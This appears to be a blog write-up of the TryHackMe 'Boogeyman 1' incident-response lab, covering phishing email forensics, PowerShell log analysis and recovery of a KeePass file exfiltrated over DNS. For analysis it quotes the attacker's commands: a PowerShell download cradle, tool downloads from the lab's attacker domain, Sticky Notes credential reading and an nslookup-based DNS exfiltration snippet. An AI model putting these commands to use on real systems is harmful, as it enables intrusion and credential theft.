# 👻 Boogeyman 1 — TryHackMe Writeup

**📅 Day 131 — 365 Days of Cybersecurity**
**✅ Status: Completed**
**🏷️ Tags:** `Phishing Analysis` `Email Forensics` `PowerShell` `DFIR` `Network Forensics` `DNS Exfiltration` `SOC` `Threat Hunting`
**⚙️ Difficulty:** Medium | **⏱️ Estimated Time:** 120 min

---

## 🧠 Overview

A new threat actor named **Boogeyman** has been identified targeting the logistics sector. In this room, I was tasked with investigating a full compromise chain — from a spearphishing email sent to a finance employee, through endpoint execution, all the way to data exfiltration over DNS.

The investigation spans three distinct phases:

1. **Email Analysis** — phishing email and malicious attachment forensics
2. **Endpoint Security** — PowerShell log analysis to reconstruct attacker actions
3. **Network Traffic Analysis** — PCAP investigation to uncover C2 communication and exfiltrated data

> **Core principle:** Follow the evidence chain. Each artifact feeds into the next — the email reveals the payload, the payload explains the PowerShell logs, and the logs explain the network traffic.

---

## 🎯 Learning Objectives

- Analyze phishing email headers and reconstruct malicious attachments
- Parse and investigate PowerShell logs in JSON format using `jq`
- Identify attacker tooling: enumeration, credential access, and exfiltration
- Analyze PCAP traffic to uncover C2 channels and DNS-based data exfiltration
- Recover exfiltrated data from encoded DNS queries

---

## 🗂️ Artifacts Provided

| File | Description |
|---|---|
| `dump.eml` | Copy of the phishing email received by the victim |
| `powershell.json` | PowerShell Operational logs from the victim's workstation (evtx → JSON via evtx2json) |
| `capture.pcapng` | Full packet capture from the victim's workstation |

All artifacts located at: `/home/ubuntu/Desktop/artefacts/`

---

## 📧 Task 2 — Email Analysis: Look at that headers!

### Scenario

**Julianne Westcott**, a finance employee at *Quick Logistics LLC*, received a follow-up email about an unpaid invoice from their supposed business partner, *B Packaging Inc.* The email contained a malicious attachment that compromised her workstation. The attack appears targeted at the finance department — a classic **Business Email Compromise (BEC)** setup.

### Investigation Approach

Two methods to analyze the `.eml` file:

**Method 1 — Manual CLI approach:**
```bash
# View raw email content
cat dump.eml

# Extract and decode the Base64 attachment
cat dump.eml | grep -v "^--\|Content" | base64 -d > Invoice.zip
```

**Method 2 — Thunderbird (GUI):**
Open the `.eml` file directly in Thunderbird, inspect headers, and save the attachment.

### Email Header Analysis

Email headers are read **bottom-up** (newest to oldest relay hop). Key fields to examine:

| Header Field | What to look for |
|---|---|
| `From:` | Sender address — check for typosquatting |
| `To:` | Victim address |
| `Reply-To:` | May differ from `From:` to redirect replies |
| `Received:` | Mail relay hops — trace the origin |
| `DKIM-Signature:` | Signing domain — reveals mail service used |
| `X-Mailer:` | Email client or service used to send |
| `List-Unsubscribe:` | Often exposes third-party relay services |

### Findings

```
Sender:    agriffin@bpakcaging.xyz         ← Note: "bpakcaging" not "bpackaging" — typosquatting
Victim:    julianne.westcott@hotmail.com
Relay:     ElasticEmail                    ← Third-party bulk mail service abused for phishing
Attachment: Invoice_20230103.lnk (inside encrypted ZIP)
ZIP Password: Invoice2023!                 ← Delivered in the email body to evade scanners
```

> **Key Tactic:** Encrypting the attachment with a password in the email body bypasses most email gateway scanners that cannot open password-protected archives.

### LNK File Analysis

Once the `.lnk` file is extracted from the archive, use **LNKParse3** to forensically analyze it:

```bash
lnkparse Invoice_20230103.lnk
```

LNK (Windows Shell Link) files are shortcut files that can contain embedded commands in their **Command Line Arguments** field — a well-known technique for initial access delivery (T1204.002 — Malicious File).

**Encoded payload found in Command Line Arguments:**
```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8Ad
wBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEA
ZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

**Decoded (Base64 → UTF-16LE):**
```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

This is a classic **PowerShell download cradle** — it fetches a remote script and executes it directly in memory using `Invoke-Expression` (`iex`), leaving no file on disk (fileless execution).

```bash
# How to decode manually
echo "<base64_string>" | base64 -d | iconv -f utf-16le -t utf-8
# Or use CyberChef: From Base64 → Decode text (UTF-16LE)
```

### MITRE ATT&CK Mapping — Email Phase

| Technique | ID | Description |
|---|---|---|
| Spearphishing Attachment | T1566.001 | Targeted phishing with malicious file |
| Malicious File (LNK) | T1204.002 | User-executed LNK with embedded PowerShell |
| Obfuscated Files | T1027 | Base64-encoded payload in LNK arguments |
| PowerShell | T1059.001 | Download cradle via `iex` + `DownloadString` |

---

## 🖥️ Task 3 — Endpoint Security: Are you sure that's an invoice?

### Investigation Approach

The PowerShell logs are stored in JSON format, making `jq` the ideal tool for parsing and filtering. The key field to focus on is `ScriptBlockText` — it captures the actual PowerShell commands executed, **including de-obfuscated content** (thanks to Script Block Logging).

### Essential `jq` Commands

```bash
# Explore available fields in the log
jq -r 'keys[]' powershell.json | sort | uniq

# View all ScriptBlockText entries sorted by timestamp (deduplicated)
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq

# Search for specific keywords
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | grep -i "download\|invoke\|iex"

# Filter entries related to a specific binary
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[]' | jq '{ScriptBlockText}' | sort | uniq | grep -e 'sq3.exe' -e 'cd'
```

### Reconstructed Attack Timeline from PowerShell Logs

**Stage 1 — Initial Execution**
```powershell
# Payload from the LNK file fires first
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

**Stage 2 — Enumeration**
```powershell
# Seatbelt downloaded — a well-known .NET enumeration framework
(new-object net.webclient).downloadfile('http://cdn.bpakcaging.xyz/seatbelt.exe', 'C:\Users\j.westcott\seatbelt.exe')
.\seatbelt.exe -group=all
```

> **Seatbelt** is a C# project that performs a number of security-oriented host-survey "safety checks" — widely used by red teamers and threat actors to enumerate system info, credentials, browser data, and more.

**Stage 3 — Credential Access via SQLite**
```powershell
# sq3.exe (SQLite CLI) used to read Microsoft Sticky Notes database
.\sq3.exe "C:\Users\j.westcott\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
SELECT * FROM NOTE;
```

> **Why Sticky Notes?** Microsoft Sticky Notes stores its data in a local SQLite database (`plum.sqlite`). Users frequently store passwords, PINs, and sensitive notes there — making it a valuable credential hunting target.

**Stage 4 — Sensitive File Discovery & Exfiltration**
```powershell
# KeePass database discovered
# File exfiltrated via DNS using nslookup with hex encoding
$data = [System.IO.File]::ReadAllBytes("protected_data.kdbx")
$hex = [System.BitConverter]::ToString($data) -replace '-',''
# Data split into chunks and sent as DNS queries
nslookup -q=A "$chunk.cdn.bpakcaging.xyz"
```

### Key Findings Summary

| Finding | Value |
|---|---|
| Attacker domains | `files.bpakcaging.xyz`, `cdn.bpakcaging.xyz` |
| Enumeration tool | Seatbelt |
| Credential target | Microsoft Sticky Notes (`plum.sqlite`) |
| Exfiltrated file | `protected_data.kdbx` (KeePass database) |
| Exfiltration encoding | Hexadecimal |
| Exfiltration method | DNS (`nslookup -q=A`) |

### MITRE ATT&CK Mapping — Endpoint Phase

| Technique | ID | Description |
|---|---|---|
| Ingress Tool Transfer | T1105 | Downloading Seatbelt and sq3.exe from C2 |
| System Information Discovery | T1082 | Seatbelt host enumeration |
| Credentials from Password Stores | T1555 | Reading KeePass `.kdbx` file |
| Data from Local System | T1005 | Accessing Sticky Notes SQLite DB |
| Exfiltration Over Alternative Protocol | T1048.003 | DNS-based exfiltration via nslookup |
| Data Encoding | T1132.001 | Hex-encoding file contents before exfiltration |

---

## 🌐 Task 4 — Network Traffic Analysis: They got us. Call the bank immediately!

### Investigation Approach

With the domains and techniques identified from PowerShell logs, we can use Wireshark and tshark to:
1. Confirm C2 infrastructure and hosting details
2. Follow HTTP streams to recover command output
3. Reconstruct the exfiltrated file from DNS traffic

### C2 Infrastructure Analysis

**Filtering for HTTP traffic to attacker's file server:**
```
# Wireshark display filter
http && ip.addr == <attacker_ip>
```

Following the TCP stream of the HTTP response revealed the server banner:
- **File server software:** Python (`SimpleHTTPServer` or `http.server`) — a common red team choice for quick payload hosting

**C2 communication method:**
- Commands sent TO the implant via HTTP GET responses
- Command output sent BACK to C2 via HTTP **POST** requests

### DNS Exfiltration Reconstruction

This is the most technically interesting part of the investigation. The attacker encoded `protected_data.kdbx` as hex, split it into chunks, and exfiltrated each chunk as a DNS A-record query subdomain:

```
# How DNS exfiltration looks in the PCAP:
4b656570617373.cdn.bpakcaging.xyz  ← each subdomain = chunk of hex data
50617373776f72.cdn.bpakcaging.xyz
...
```

**Step 1 — Extract DNS query names from PCAP using tshark:**
```bash
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name | grep ".bpakcaging.xyz"
```

**Step 2 — Clean and isolate only the hex-encoded chunks:**
```bash
tshark -r capture.pcapng -Y 'dns' -T fields -e dns.qry.name \
  | grep ".bpakcaging.xyz" \
  | cut -f1 -d '.' \
  | grep -v -e "files" -e "cdn" \
  | uniq \
  | tr -d '\n'
```

**Step 3 — Decode the hex string:**
```bash
# Save to file and decode
tshark ... > extracted.txt
xxd -r -p extracted.txt > protected_data.kdbx
# Or use CyberChef: From Hex → Save as file
```

**Step 4 — Recover the KeePass master password:**

From the Wireshark HTTP stream (packet 749-750), the attacker queried the Sticky Notes SQLite database and exfiltrated the results. The output was encoded as decimal values, decoded via CyberChef using **"From Decimal"** recipe, revealing the KeePass master password:
```
%p9³!lL^Mz47E2GaT^y
```

**Step 5 — Open the KeePass database:**

With the recovered password, the `.kdbx` file can be opened in KeePass, revealing stored credentials — including a **credit card number** stored as a sensitive entry.

### tshark Command Reference Used

| Command | Purpose |
|---|---|
| `tshark -r file.pcap -Y 'http' -T fields -e http.request.method` | Show HTTP methods |
| `tshark -r file.pcap -Y 'dns' -T fields -e dns.qry.name` | Extract all DNS query names |
| `grep ".domain.xyz"` | Filter for attacker's domains |
| `cut -f1 -d '.'` | Extract subdomain (exfiltrated chunk) |
| `uniq` | Remove duplicate queries |
| `tr -d '\n'` | Join all chunks into one line |

### MITRE ATT&CK Mapping — Network Phase

| Technique | ID | Description |
|---|---|---|
| Application Layer Protocol: Web | T1071.001 | HTTP-based C2 communication |
| Exfiltration Over Alternative Protocol: DNS | T1048.003 | KeePass DB exfiltrated via DNS queries |
| Data Encoding: Standard Encoding | T1132.001 | Hex encoding for DNS exfiltration |

---

## 🧬 Full Attack Chain — MITRE ATT&CK Summary

```
[Initial Access]
  T1566.001 — Spearphishing Attachment (invoice lure targeting finance)

[Execution]
  T1204.002 — Malicious LNK file executed by victim
  T1059.001 — PowerShell download cradle (fileless stage 1)

[Discovery]
  T1082  — System Information Discovery (Seatbelt)
  T1083  — File and Directory Discovery

[Credential Access]
  T1555  — Credentials from Password Stores (Sticky Notes → KeePass password)
  T1005  — Data from Local System (plum.sqlite)

[Command and Control]
  T1071.001 — C2 over HTTP (POST for output)
  T1105     — Remote tool staging (Seatbelt, sq3.exe from attacker server)

[Exfiltration]
  T1048.003 — Exfiltration over DNS
  T1132.001 — Hex encoding of exfiltrated file
```

---

## 🚨 Indicators of Compromise (IoCs)

### Network-Based
| IoC | Type | Description |
|---|---|---|
| `files.bpakcaging.xyz` | Domain | Payload/file hosting server |
| `cdn.bpakcaging.xyz` | Domain | C2 server + DNS exfiltration receiver |
| `agriffin@bpakcaging.xyz` | Email | Attacker sender address |
| Python SimpleHTTPServer | Service | Attacker's file hosting software |

### Host-Based
| IoC | Type | Description |
|---|---|---|
| `Invoice_20230103.lnk` | File | Malicious LNK inside encrypted ZIP |
| `seatbelt.exe` | File | Enumeration tool downloaded to workstation |
| `sq3.exe` | File | SQLite CLI used for credential access |
| `protected_data.kdbx` | File | Exfiltrated KeePass database |
| `plum.sqlite` | File | Targeted Sticky Notes database |

### Behavioral
- PowerShell spawned from LNK execution
- `nslookup` making repeated DNS A-record queries with hex subdomains
- HTTP POST traffic from workstation to unknown external IP
- Outbound connections to recently-registered typosquatted domain

---

## 🛡️ Detection Opportunities

```sql
-- LNK file executing PowerShell (common initial access pattern)
EventID = 4688 AND
ParentCommandLine LIKE "%.lnk%" AND
NewProcessName LIKE "%powershell%"

-- PowerShell download cradle
EventID = 4104 AND
ScriptBlockText CONTAINS ("DownloadString" OR "DownloadFile" OR "WebClient") AND
ScriptBlockText CONTAINS ("iex" OR "Invoke-Expression")

-- DNS exfiltration (high-entropy subdomain queries)
dns.query.name MATCHES "[0-9a-f]{20,}\\..*" AND  -- long hex subdomains
dns.query.type = "A" AND
dns.query.name NOT IN (known_good_domains)

-- Suspicious nslookup usage
EventID = 4688 AND
NewProcessName LIKE "%nslookup%" AND
CommandLine CONTAINS ("-q=A")

-- SQLite access to Sticky Notes
EventID = 4663 AND
ObjectName LIKE "%plum.sqlite%"
```

---

## 🛠️ Tools Used in This Investigation

| Tool | Purpose |
|---|---|
| **Thunderbird** | Opening and inspecting `.eml` phishing email |
| **LNKParse3** (`lnkparse`) | Forensic analysis of malicious LNK file |
| **jq** | Parsing and filtering JSON-formatted PowerShell logs |
| **Wireshark** | GUI-based PCAP analysis and TCP stream following |
| **tshark** | CLI-based packet parsing and DNS data extraction |
| **CyberChef** | Decoding Base64, hex, and decimal encoded payloads |
| **KeePass** | Opening the recovered `.kdbx` database |
| **base64** / **iconv** | Command-line payload decoding |
| **grep / cut / uniq / tr** | Stream processing for data extraction |

---

## 🧪 Key Concepts Practiced

- Phishing email header analysis and artifact reconstruction
- LNK file forensics with LNKParse3
- PowerShell Script Block Log analysis with `jq`
- Identifying fileless execution via download cradles
- Recognizing attacker tooling (Seatbelt, SQLite CLI)
- Network-based C2 identification in PCAP
- **DNS exfiltration reconstruction** — extracting and reassembling a file from DNS query subdomains
- Decoding multi-layer encoded data (Base64 → PowerShell, Hex → binary, Decimal → string)

---

## 🧠 Key Takeaways

1. **Typosquatting is subtle but detectable.** `bpakcaging.xyz` vs `bpackaging.com` — one transposed letter. Always validate sender domains against known business partners, especially in finance contexts.

2. **Encrypted attachments are a scanner bypass, not a protection.** A ZIP file with a password in the email body is a major red flag. Legitimate businesses don't send encrypted archives with the password in the same email.

3. **LNK files are powerful initial access vehicles.** A `.lnk` shortcut looks innocuous but can contain arbitrary PowerShell commands. Users should never trust attachments that extract to `.lnk` files.

4. **Script Block Logging (Event 4104) is one of the most valuable defenses.** It captures PowerShell content *after* de-obfuscation — meaning even if the attacker encodes their payload, the decoded version is logged.

5. **DNS is not just for name resolution.** Attackers abuse DNS for both C2 and data exfiltration because it's rarely blocked and blends in with legitimate traffic. Monitoring for high-entropy or unusually long DNS subdomains is essential in a mature SOC.

6. **Sensitive data lives in unexpected places.** Sticky Notes, browser storage, and chat applications are often overlooked by users but are prime targets for credential harvesting. Security awareness should cover what not to store in these tools.

7. **`jq` is indispensable for log analysis at scale.** Structured JSON logs combined with `jq` filtering let you pivot on any field, sort by timestamp, and chain queries — far more efficient than grepping raw text.

---

## 📌 Final Thoughts

Boogeyman 1 is an excellent room that simulates a realistic, multi-stage attack chain with the kind of evidence you'd actually encounter in a SOC investigation. What makes it particularly valuable is that each phase of the investigation (email → endpoint → network) builds directly on the previous one — nothing is isolated.

The DNS exfiltration section stands out as one of the most technically interesting exercises: reconstructing a binary file from fragmented DNS queries using tshark, command-line text processing, and CyberChef demonstrates that **data exfiltration doesn't need to look dramatic to be damaging**.

The attack pattern here — finance-targeted spearphishing → malicious LNK → fileless PowerShell → enumeration → credential theft → DNS exfiltration — mirrors real-world campaigns attributed to groups like **FIN7** and various initial access brokers operating in the logistics and finance sectors.

